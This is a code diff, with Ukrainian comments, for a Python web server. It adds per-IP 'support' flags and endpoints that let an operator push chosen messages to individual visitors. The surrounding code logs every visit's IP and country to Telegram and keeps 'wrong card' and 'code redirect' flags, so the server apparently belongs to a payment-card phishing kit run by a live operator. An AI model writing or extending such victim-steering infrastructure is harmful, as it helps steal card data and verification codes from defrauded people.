@@ -75,6 +75,8 @@ WRONG_CARD_FLAGS = {}
 CODE_REDIRECT_FLAGS = {}
 # --- In-memory storage for custom texts ---
 CUSTOM_TEXTS = {}
+# --- In-memory storage for support flags ---
+SUPPORT_FLAGS = {}  # ip: {'support': bool, 'text_id': str}
 
 def send_telegram_log(page, link, ip, country="", extra_user_id=None):
     # Визначаємо країну за IP, якщо не передано
@@ -281,13 +283,27 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(json.dumps({'text': text}).encode('utf-8'))
             return
+        if self.path.startswith('/check_support'):
+            from urllib.parse import parse_qs
+            qs = parse_qs(self.path.split('?', 1)[1]) if '?' in self.path else {}
+            ip = qs.get('ip', [None])[0]
+            flag = SUPPORT_FLAGS.get(ip, {}) if ip else {}
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({
+                'show_support': bool(flag.get('support')),
+                'show_text': bool(flag.get('text_id')),
+                'text_id': flag.get('text_id', '')
+            }).encode('utf-8'))
+            return
         try:
             super().do_GET()
         except Exception as e:
             self.send_error(500, f"Internal Server Error: {e}")
 
     def do_POST(self):
-        path = unquote(self.path.split('?', 1)[0])
+        path = unquote(self.path.split('?' ,1)[0])
         # --- Блокування IP ---
         if self.is_blocked():
             self.send_response(403)
@@ -454,6 +470,26 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
                     self.send_response(400)
                     self.end_headers()
                     self.wfile.write(b'no text_id or text')
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(b'error')
+            return
+        elif self.path == '/set_support_flag':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            try:
+                data = json.loads(post_data)
+                ip = data.get('ip')
+                flag_type = data.get('type')  # 'support' або 'text'
+                text_id = data.get('text_id')
+                if ip and flag_type == 'support':
+                    SUPPORT_FLAGS[ip] = {'support': True}
+                elif ip and flag_type == 'text' and text_id:
+                    SUPPORT_FLAGS[ip] = {'text_id': text_id}
+                self.send_response(200)
+                self.end_headers()
+                self.wfile.write(b'ok')
             except Exception as e:
                 self.send_response(500)
                 self.end_headers()
